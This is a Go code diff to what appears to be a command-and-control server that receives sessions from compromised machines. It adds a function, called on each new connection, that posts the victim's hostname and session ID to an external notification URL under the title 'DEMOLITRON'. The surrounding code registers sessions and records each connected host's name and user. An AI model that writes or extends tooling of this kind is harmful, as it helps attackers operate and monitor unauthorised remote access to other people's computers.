@@ -3,13 +3,22 @@ package main
 import (
 	//"crypto/sha256"
 	"fmt"
+	"net/http"
 	"strconv"
+	"strings"
 	"time"
 
 	//"hash/sha256"
 
 	"net"
 )
+
+func notifAgentConnected(hostname string, sessionID int) {
+	req, _ := http.NewRequest("POST", notifURL, strings.NewReader("Host: "+hostname+"\nID: "+strconv.Itoa(sessionID)))
+	req.Header.Set("Title", "DEMOLITRON")
+	req.Header.Set("Tags", "skull")
+	http.DefaultClient.Do(req)
+}
 
 func NewListenerList() *ListenerList {
 	return &ListenerList{
@@ -27,6 +36,7 @@ func handleClient(ll *ListenerList, conn *net.Conn, port string, sl *SessionList
 	hostname, user := hostinfo(conn)                         //Get some hostinfo instantly without much headache
 	currentSessionID := sl.registerSession(port, hostname, user, *conn)
 	fmt.Println("[!]Sesssion ID: " + strconv.Itoa(currentSessionID))
+	notifAgentConnected(hostname, currentSessionID)
 	ll.updateListenerStatus(port, "SESSION")
 	//Checks if the session is still alive. Rewrite this in the sessions and not in the listeners section
 	for {
